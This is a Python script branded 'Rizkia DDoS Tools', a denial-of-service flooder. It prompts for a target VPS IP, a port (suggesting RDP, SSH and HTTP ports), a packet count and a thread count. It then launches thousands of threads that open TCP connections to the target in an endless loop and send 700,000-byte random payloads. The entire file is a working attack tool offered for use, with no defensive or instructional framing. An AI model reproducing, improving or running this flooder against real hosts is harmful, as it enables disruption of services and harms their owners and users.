# -*- coding: utf-8 -*-


# Import Module
import random
import socket
import time
import threading
import os
# Info Tools [ Riz Tool ]
print("Installing Requiment")
os.system("py -m pip install requests")
print("Succes Install Requests")

os.system("cls")


print("""
████  █████ █████ █  █  █████  ███  
█   █   █      █  █ █     █   █   █ 
████    █     █   ███     █   █████ 
█   █   █    █    █  █    █   █   █ 
█   █ █████ █████ █   █ █████ █   █

[ @ ] Rizkia DDoS Tools.
""")

ip = str(input("[+] Target VPS IP : "))
port = int(input("[+] Enter RDP Port (80/3389/22/17091)   : "))
times = int(input("[+] Jumlah Packet : "))
threads = int(input("[+] Jumlah Thread (Recomended 5024) : "))

def run():
    data = random._urandom(700000)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sending Packet!!!")
        except socket.error:
            s.close()
            print("[!] Rizkia DDOS Strated To =>>>>>>. ",ip," With Port : ",port,"!")

           

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
